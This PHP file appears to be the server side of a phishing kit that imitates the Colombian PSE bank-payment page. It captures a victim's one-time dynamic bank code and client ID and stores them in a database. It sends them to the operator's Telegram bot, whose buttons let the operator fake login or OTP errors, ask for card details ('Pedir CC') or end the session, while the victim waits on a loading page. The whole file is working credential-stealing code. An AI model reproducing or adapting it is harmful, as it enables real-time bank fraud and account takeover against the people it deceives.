<?php
// Adjust paths to point to panels/aire root
include '../../../config/db.php';
$config = include '../../../config/config.php';

// Función para escapar caracteres especiales en MarkdownV2
function escapeMarkdownV2($text)
{
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cliente_id = $_POST['cliente_id']; // ID del cliente
    $claveDinamica = $_POST['claveDinamica']; // Clave dinámica ingresada

    if (empty($cliente_id) || empty($claveDinamica)) {
        die("Error: Todos los campos son obligatorios.");
    }

    // Actualizar estado y GUARDAR EL OTP en la base de datos
    $estado = 1; // Estado: 1 para que suene en admin y ESPERE instrucción
    $sql = "UPDATE pse SET estado = :estado, otp = :otp WHERE id = :id";
    $stmt = $conn->prepare($sql);

    if ($stmt->execute(['estado' => $estado, 'otp' => $claveDinamica, 'id' => $cliente_id])) {
        // Enviar datos a Telegram
        $botToken = $config['botToken'];
        $chatId = $config['chatId'];
        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];

        $message = "🔐 *Clave Dinámica Ingresada*\n\n"
            . "📱 *ID Cliente:* `" . escapeMarkdownV2($cliente_id) . "`\n"
            . "🔑 *Clave Dinámica:* `" . escapeMarkdownV2($claveDinamica) . "`";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"]
                ],
                [
                    ['text' => 'Pedir CC', 'url' => "$baseUrl?id=$cliente_id&estado=5&key=$security_key"],
                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key"]
                ]
            ]
        ];

        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'MarkdownV2',
            'reply_markup' => json_encode($keyboard)
        ];

        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
            ]
        ];

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        // Redirigir a la página cargando.php con el ID del cliente
        header("Location: ../cargando.php?id=" . $cliente_id);
        exit();
    } else {
        echo "Error al actualizar el estado.";
    }
}
?>